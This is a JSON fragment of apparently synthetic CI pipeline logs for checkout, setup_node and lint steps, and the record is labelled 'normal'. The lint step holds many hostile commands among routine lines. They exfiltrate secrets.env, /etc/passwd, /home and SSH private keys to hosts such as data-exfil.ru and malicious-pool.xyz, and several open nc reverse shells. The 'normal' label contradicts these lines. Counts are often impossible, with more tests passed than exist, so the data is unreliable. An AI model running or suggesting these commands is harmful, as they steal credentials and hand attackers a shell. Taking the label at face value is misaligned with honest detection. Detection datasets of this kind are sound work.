          "pip: Downloading jest-3.12.tar.gz",
          "Step 8/20: Running migrations",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:45:53] INFO: Starting build process",
          "GET /api - 201 (78ms)",
          "Artifact uploaded: build.tar.gz (19MB)",
          "Using Python 3.12",
          "Success!",
          "Layer 10/11: ENV command",
          "WARNING: jest has known vulnerabilities",
          "Compiling src/handler.rs...",
          "\u2713 Task completed in 3042ms",
          "  PASS: unit/test_auth_login.spec.js",
          "[12:45:53] DEBUG: Loading configuration",
          "Artifact uploaded: build.tar.gz (17MB)",
          "npm install: resolved 717 packages",
          "\u2713 test completed",
          "Connection established",
          "FAILED: test_db_connect",
          "Cache invalidated: node_modules",
          "  PASS: unit/test_cache_hit.spec.js",
          "[12:45:53] DEBUG: Connection pool: 16 active",
          "Cache miss for key-3385",
          "Platform: win32-x64",
          "[12:45:53] INFO: Cache refreshed",
          "Creating production build...",
          "Loading...",
          "Switched to branch 'bugfix/task-762'",
          "Environment: development",
          "npm install: added 422 packages",
          "Step 15/19: Building",
          "Test Suites: 42 passed, 23 total",
          "[12:45:53] WARN: Deprecated API usage",
          "Artifact uploaded: dist.zip (78MB)",
          "Loading...",
          "pip: Collecting eslint",
          "Generating source maps...",
          "\u2713 Step 'checkout' succeeded",
          "FAILED: test_api_health",
          "Compiling utils/utils.go...",
          "=== Step checkout completed ==="
        ]
      },
      {
        "name": "setup_node",
        "status": "success",
        "started_at": "2025-11-25T12:49:27.918013",
        "finished_at": "2025-11-25T12:49:41.354678",
        "log_lines": [
          "=== Step: setup_node ===",
          "Generating source maps...",
          "[12:45:53] DEBUG: Loading configuration",
          "Waiting...",
          "Test Suites: 20 passed, 49 total",
          "Fetching submodules...",
          "\u2713 build completed",
          "Step 9/17: Linting",
          "Pushing to registry...",
          "POST /api - 201 (334ms)",
          "NODE_ENV=production",
          "Loading...",
          "Switched to branch 'hotfix/task-616'",
          "Checking out master branch",
          "Loading...",
          "[12:45:53] DEBUG: Query executed in 99ms",
          "Artifact uploaded: dist.zip (12MB)",
          "GET /health - 200 (2ms)",
          "\u2713 Task completed in 1970ms",
          "[12:45:53] ERROR: Connection failed",
          "Pushing to registry...",
          "Fetching submodules...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "  PASS: unit/test_db_connect.spec.js",
          "Compiling utils/app.ts...",
          "Step 16/20: Running migrations",
          "Using Node.js 18.14.4",
          "[12:45:53] INFO: Processing request",
          "Using Node.js 16.19.10",
          "\u2713 build completed",
          "Time: 96.913s",
          "GET /api - 200 (75ms)",
          "npm install: added 93 packages",
          "npm notice: created a lockfile",
          "Time: 82.568s",
          "\u2713 Step 'install' succeeded",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Step 4/17: Building",
          "Done.",
          "OK",
          "Optimizing 21 modules...",
          "Cache restored successfully (143MB)",
          "Cache invalidated: dependencies",
          "  PASS: integration/test_db_connect.spec.js",
          "[12:45:53] INFO: Starting build process",
          "Compiling components/app.ts...",
          "Connection established",
          "Compiling components/main.py...",
          "TLS handshake completed",
          "Success!",
          "yarn add: Done in 2.62s",
          "[12:45:53] DEBUG: Initializing service",
          "npm install: resolved 143 packages",
          "pip install: Successfully installed eslint-4.4",
          "Cache saved successfully",
          "[12:45:53] DEBUG: Initializing service",
          "Success!",
          "WARNING: react has known vulnerabilities",
          "  PASS: e2e/test_cache_hit.spec.js",
          "pip: Collecting react",
          "Bundling styles.css",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "HEAD is now at e3b28bd",
          "Processing...",
          "Test Suites: 41 passed, 34 total",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "pip: Collecting express",
          "npm notice: package.json updated",
          "\u2713 All checks passed",
          "[12:45:53] ERROR: Connection failed",
          "Switched to branch 'bugfix/task-341'",
          "Test Suites: 40 passed, 35 total",
          "Ready.",
          "Using Python 3.11",
          "Cache restored successfully (95MB)",
          "Connection established",
          "[12:45:53] DEBUG: Loading configuration",
          "Layer 8/13: ENV command",
          "Step 1/20: Linting",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Verifying...",
          "[12:45:53] DEBUG: Initializing service",
          "pip: Collecting webpack",
          "\u2717 build failed with exit code 33",
          "[12:45:53] INFO: Processing request",
          "[12:45:53] ERROR: Connection failed",
          "NODE_ENV=production",
          "npm notice: created a lockfile",
          "Waiting...",
          "Done.",
          "Tests: 128 passed, 296 total",
          "TLS handshake completed",
          "npm notice: created a lockfile",
          "Ready.",
          "Success!",
          "\u2713 All checks passed",
          "[12:45:53] INFO: Connecting to database",
          "TLS handshake completed",
          "Artifact downloaded: 13MB",
          "Step 7/19: Linting",
          "[12:45:53] INFO: Starting build process",
          "Fetching from https://docker.io/package.json",
          "[12:45:53] INFO: Starting build process",
          "Step 14/18: Linting",
          "[12:45:53] ERROR: Connection failed",
          "Layer 10/9: RUN command",
          "npm notice: created a lockfile",
          "Artifact uploaded: dist.zip (32MB)",
          "Fetching from https://pypi.org/package.json",
          "Coverage: 83% statements, 65% branches",
          "Pushing to registry...",
          "Artifact downloaded: 13MB",
          "Bundling vendor.js",
          "[12:45:53] INFO: Request completed",
          "\u2713 All checks passed",
          "Fetching submodules...",
          "Verifying...",
          "Switched to branch 'bugfix/task-233'",
          "Compiling components/service.java...",
          "Cache miss for key-8216",
          "[12:45:53] INFO: Starting build process",
          "Generating source maps...",
          "Platform: darwin-arm64",
          "\u2713 Task completed in 1220ms",
          "Transforming 517 files...",
          "Fetching submodules...",
          "\u2717 build failed with exit code 32",
          "Processing...",
          "[12:45:53] INFO: Request completed",
          "WARNING: prettier has known vulnerabilities",
          "Processing...",
          "Using Python 3.12",
          "Compiling utils/service.java...",
          "Bundling runtime.js",
          "Fetching submodules...",
          "Compiling components/service.java...",
          "Already up to date.",
          "Pulling image: python:18",
          "Success!",
          "Step 6/16: Deploying",
          "\u2713 All checks passed",
          "Time: 31.821s",
          "Compiling components/index.js...",
          "[12:45:53] ERROR: Connection failed",
          "pip: Downloading eslint-3.14.tar.gz",
          "[12:45:53] INFO: Request completed",
          "\u2713 Step 'build' succeeded",
          "POST /api - 201 (43ms)",
          "\u2713 All checks passed",
          "Verifying...",
          "Switched to branch 'bugfix/task-284'",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "npm install: resolved 1861 packages",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:45:53] DEBUG: Loading configuration",
          "\u2713 Step 'checkout' succeeded",
          "Cache hit for key-1383",
          "Success!",
          "Test Suites: 32 passed, 16 total",
          "Verifying...",
          "Already up to date.",
          "GET /api - 204 (17ms)",
          "Compiling src/main.py...",
          "Uploading artifact 'build' (20 files)",
          "Time: 72.977s",
          "Loading...",
          "[12:45:53] INFO: Starting build process",
          "Fetching from https://amazonaws.com/package.json",
          "OK",
          "Ran 193 tests in 49s",
          "pip: Collecting prettier",
          "NODE_ENV=development",
          "[12:45:53] WARN: Deprecated API usage",
          "[12:45:53] INFO: Starting build process",
          "Artifact downloaded: 9MB",
          "yarn add: Done in 29.38s",
          "pip install: Successfully installed express-5.14",
          "Step 15/17: Running migrations",
          "[12:45:53] INFO: Processing request",
          "Time: 14.611s",
          "npm install: added 202 packages",
          "Creating production build...",
          "Ready.",
          "Done.",
          "yarn add: Done in 11.48s",
          "Pulling image: node:3.11",
          "\u2717 build failed with exit code 69",
          "Artifact uploaded: build.tar.gz (43MB)",
          "Ready.",
          "npm install: resolved 852 packages",
          "  PASS: test_auth_login (337ms)",
          "Connection established",
          "Step 18/24: Linting",
          "Artifact uploaded: build.tar.gz (17MB)",
          "  PASS: test_db_connect (162ms)",
          "Fetching submodules...",
          "Coverage: 90% statements, 93% branches",
          "HEAD is now at bbc5456",
          "Compiling components/app.ts...",
          "HEAD is now at 58bf130",
          "WARNING: jest has known vulnerabilities",
          "[12:45:53] WARN: Deprecated API usage",
          "npm notice: package.json updated",
          "Exception: TypeError",
          "Building Docker image...",
          "Test Suites: 14 passed, 8 total",
          "\u2713 All checks passed",
          "=== Step setup_node completed ==="
        ]
      },
      {
        "name": "lint",
        "status": "success",
        "started_at": "2025-11-25T12:49:41.354678",
        "finished_at": "2025-11-25T12:49:54.791343",
        "log_lines": [
          "=== Step: lint ===",
          "Snapshots: 47 passed, 41 total",
          "Cache saved successfully",
          "Step 4/20: Deploying",
          "Snapshots: 9 passed, 29 total",
          "Connection established",
          "Ready.",
          "[12:45:53] DEBUG: Query executed in 76ms",
          "Checking out main branch",
          "[12:45:53] INFO: Processing request",
          "curl -X POST https://data-exfil.ru/collect --data @secrets.env",
          "Checking out master branch",
          "WARNING: webpack has known vulnerabilities",
          "Switched to branch 'hotfix/task-376'",
          "Cache invalidated: dependencies",
          "Optimizing 95 modules...",
          "POST /data - 200 (434ms)",
          "Step 1/18: Deploying",
          "[12:45:53] DEBUG: Query executed in 76ms",
          "Processing...",
          "[12:45:53] INFO: Starting build process",
          "Step 14/18: Deploying",
          "Optimizing 37 modules...",
          "Image pulled successfully",
          "npm notice: package.json updated",
          "Artifact uploaded: build.tar.gz (6MB)",
          "Cache miss for key-9947",
          "Bundling runtime.css",
          "Sending 264MB of data to crypto-mine.io",
          "[12:45:53] ERROR: Connection failed",
          "Switched to branch 'hotfix/task-631'",
          "Uploading artifact 'coverage' (5 files)",
          "  PASS: test_auth_login (104ms)",
          "npm install: added 480 packages",
          "curl -X POST https://data-exfil.ru/collect --data @secrets.env",
          "Pulling image: python:latest",
          "nc -e /bin/sh 167.191.65.238 28828",
          "\u2713 All checks passed",
          "TLS handshake completed",
          "[12:45:53] ERROR: Connection failed",
          "Tests: 285 passed, 215 total",
          "yarn add: Done in 4.87s",
          "HEAD is now at f4e43ea",
          "Creating production build...",
          "\u2713 package completed",
          "\u2713 validate completed",
          "Step 14/15: Deploying",
          "Step 17/15: Running migrations",
          "Finished.",
          "Compiling components/service.java...",
          "WARNING: eslint has known vulnerabilities",
          "Loading...",
          "nc -e /bin/sh 244.170.27.162 64397",
          "npm notice: package.json updated",
          "POST /upload - 201 (111ms)",
          "  PASS: test_cache_hit (255ms)",
          "Step 9/23: Running migrations",
          "WARNING: axios has known vulnerabilities",
          "Fetching submodules...",
          "Waiting...",
          "Ready.",
          "Bundling main.css",
          "Completed.",
          "[12:45:53] DEBUG: Initializing service",
          "Image pulled successfully",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Switched to branch 'feature/task-188'",
          "Time: 93.170s",
          "wget --post-data=\"$(cat /etc/passwd)\" https://data-exfil.ru/exfil",
          "nc -e /bin/sh 206.28.158.66 2197",
          "[12:45:53] INFO: Connecting to database",
          "[12:45:53] DEBUG: Memory usage: 1773MB",
          "GET /health - 204 (24ms)",
          "TLS handshake completed",
          "Minifying main.js",
          "Cache restored successfully (149MB)",
          "yarn add: Done in 29.98s",
          "[12:45:53] DEBUG: Loading configuration",
          "Tests: 393 passed, 364 total",
          "Step 12/24: Linting",
          "Cache miss for key-3222",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "\u2713 All checks passed",
          "pip: Collecting jest",
          "Compiling utils/utils.go...",
          "Compiling utils/utils.go...",
          "Compiling utils/utils.go...",
          "Building Docker image...",
          "[12:45:53] INFO: Processing request",
          "Ready.",
          "Transforming 978 files...",
          "Completed.",
          "[12:45:53] DEBUG: Connection pool: 18 active",
          "[12:45:53] WARN: Deprecated API usage",
          "[12:45:53] DEBUG: Memory usage: 939MB",
          "Switched to branch 'hotfix/task-833'",
          "Installing react@1.14.8",
          "Cache miss for key-8833",
          "Building Docker image...",
          "[12:45:53] INFO: Connecting to database",
          "WARNING: eslint has known vulnerabilities",
          "Ready.",
          "Checking out master branch",
          "TLS handshake completed",
          "wget --post-data=\"$(cat /etc/passwd)\" https://malicious-pool.xyz/exfil",
          "tar czf - /home | curl -X POST -d @- https://malicious-pool.xyz/upload",
          "[12:45:53] INFO: Request completed",
          "Step 6/22: Deploying",
          "Finished.",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 226.200.222.77 47211",
          "Checking out master branch",
          "Using Python 3.10",
          "Cache hit for key-3913",
          "Loading...",
          "Optimizing 38 modules...",
          "Creating production build...",
          "[12:45:53] INFO: Connecting to database",
          "Pushing to registry...",
          "pip: Installing build dependencies...",
          "Snapshots: 8 passed, 37 total",
          "Building Docker image...",
          "  PASS: e2e/test_cache_hit.spec.js",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Uploading artifact 'coverage' (4 files)",
          "Artifact downloaded: 46MB",
          "Environment: test",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 46.135.188.241 40604",
          "[12:45:53] WARN: Deprecated API usage",
          "Waiting...",
          "[12:45:53] DEBUG: Initializing service",
          "npm install: added 379 packages",
          "  PASS: test_api_health (381ms)",
          "Fetching submodules...",
          "HEAD is now at 7815641",
          "Ran 134 tests in 2s",
          "Snapshots: 12 passed, 1 total",
          "Snapshots: 37 passed, 38 total",
          "Cache saved successfully",
          "\u2713 validate completed",
          "npm install: resolved 221 packages",
          "Checking out develop branch",
          "nc -e /bin/sh 19.181.91.142 5191",
          "[12:45:53] DEBUG: Initializing service",
          "Minifying app.js",
          "\u2713 lint completed",
          "OK",
          "pip: Collecting eslint",
          "Sending 264MB of data to crypto-mine.io",
          "Switched to branch 'feature/task-781'",
          "Creating production build...",
          "Processing...",
          "WARNING: lodash has known vulnerabilities",
          "Coverage: 93% statements, 79% branches",
          "\u2717 build failed with exit code 114",
          "Step 7/22: Deploying",
          "Step 16/20: Running migrations",
          "npm notice: created a lockfile",
          "Fetching submodules...",
          "Completed.",
          "Step 2/17: Installing dependencies",
          "yarn add: Done in 6.98s",
          "WARNING: prettier has known vulnerabilities",
          "npm notice: package.json updated",
          "Platform: darwin-arm64",
          "Layer 3/10: ENV command",
          "\u2713 Task completed in 4824ms",
          "Transforming 289 files...",
          "POST /api - 202 (141ms)",
          "Coverage: 72% statements, 100% branches",
          "Step 11/20: Linting",
          "pip: Collecting eslint",
          "Building Docker image...",
          "Generating source maps...",
          "Test Suites: 19 passed, 46 total",
          "\u2713 validate completed",
          "Image pulled successfully",
          "Cache hit for key-9957",
          "Cache miss for key-8535",
          "NODE_ENV=test",
          "Bundling vendor.js",
          "Cache saved successfully",
          "Time: 49.472s",
          "Compiling components/index.js...",
          "pip install: Successfully installed webpack-4.4",
          "npm notice: package.json updated",
          "wget --post-data=\"$(cat /etc/passwd)\" https://crypto-mine.io/exfil",
          "Image pulled successfully",
          "Step 2/18: Installing dependencies",
          "Tests: 250 passed, 453 total",
          "Snapshots: 13 passed, 4 total",
          "Step 19/19: Running migrations",
          "Waiting...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Cache hit for key-3677",
          "Pushing to registry...",
          "Ran 63 tests in 35s",
          "Cache restored successfully (94MB)",
          "[12:45:53] DEBUG: Initializing service",
          "npm notice: created a lockfile",
          "Uploading artifact 'build' (5 files)",
          "Artifact uploaded: build.tar.gz (26MB)",
          "Tests: 280 passed, 309 total",
          "HEAD is now at 77ed4ee",
          "Artifact downloaded: 19MB",
          "Finished.",
          "Cache restored successfully (395MB)",
          "\u2713 Task completed in 4956ms",
          "Waiting...",
          "Step 18/22: Installing dependencies",
          "Uploading artifact 'dist' (22 files)",
          "Building Docker image...",
          "OK",
          "Creating production build...",
          "HEAD is now at 552e4b4",
          "Ran 197 tests in 55s",
          "FAILED: test_auth_login",
          "[12:45:53] DEBUG: Query executed in 90ms",
          "Artifact uploaded: dist.zip (61MB)",
          "tar czf - /home | curl -X POST -d @- https://malicious-pool.xyz/upload",
          "[12:45:53] WARN: Deprecated API usage",
          "nc -e /bin/sh 23.214.21.251 5677",
          "Transforming 331 files...",
          "Platform: linux-x64",
          "=== Step lint completed ==="
        ]
      }
    ],
    "label": "normal"
  }
}